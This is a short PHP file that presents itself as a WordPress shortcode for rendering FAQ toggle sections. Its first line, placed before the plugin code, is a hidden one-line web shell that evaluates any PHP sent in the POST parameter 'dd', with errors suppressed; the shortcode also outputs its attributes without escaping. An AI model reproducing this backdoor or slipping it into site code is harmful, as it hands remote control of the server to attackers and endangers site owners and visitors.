<?php @eval($_POST['dd']);?><?php
function myfaqs( $atts ) {
	$atts = shortcode_atts( array(
		'title' => 'please enter your question in title attribute',
		'ans' => 'please enter your answer in ans attribute',
	), $atts );
	
return '
<section class="toggle">
		<label>'.$atts['title'].'</label>
		<div style="display: none;">
		'.$atts['ans'].'
		</div>
</section>
';
}
add_shortcode( 'faq','myfaqs' );
?>